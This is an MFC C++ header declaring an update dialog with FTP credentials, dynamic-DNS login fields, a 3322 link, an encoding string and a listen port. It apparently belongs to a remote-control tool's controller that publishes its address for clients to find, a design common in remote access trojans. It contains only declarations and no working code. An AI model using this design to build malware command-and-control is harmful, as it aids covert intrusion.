#if !defined(AFX_UPDATEDLG_H__27656C1A_681C_4AD9_A208_EE927F29F753__INCLUDED_)
#define AFX_UPDATEDLG_H__27656C1A_681C_4AD9_A208_EE927F29F753__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// UpdateDlg.h : header file
//
#include "StatLink.h"
/////////////////////////////////////////////////////////////////////////////
// CUpdateDlg dialog

class CUpdateDlg : public CDialog
{
// Construction
public:
	CUpdateDlg(CWnd* pParent = NULL);   // standard constructor
	DWORD FtpUpdate();
	static DWORD __stdcall FtpUpdateThread(void* pThis);
// Dialog Data
	//{{AFX_DATA(CUpdateDlg)
	enum { IDD = IDD_UPDATE_DLG };
	CStaticLink	m_ftp;
	CStaticLink	m_3322;
	CComboBox	m_Combo_FtpIP;
	CComboBox	m_Combo_DnsIP;
	CString	m_DnsUser;
	CString	m_DnsPass;
	CString	m_DnsDomain;
	CString	m_FtpIP;
	CString	m_FtpPass;
	UINT	m_FtpPort;
	CString	m_FtpUser;
	CString	m_FtpUrl;
	CString	m_encode;
	CString	m_listen_port;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CUpdateDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CUpdateDlg)
	afx_msg void OnBtnFtpupdate();
	afx_msg void OnBtnDnsupdate();
	virtual BOOL OnInitDialog();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_UPDATEDLG_H__27656C1A_681C_4AD9_A208_EE927F29F753__INCLUDED_)
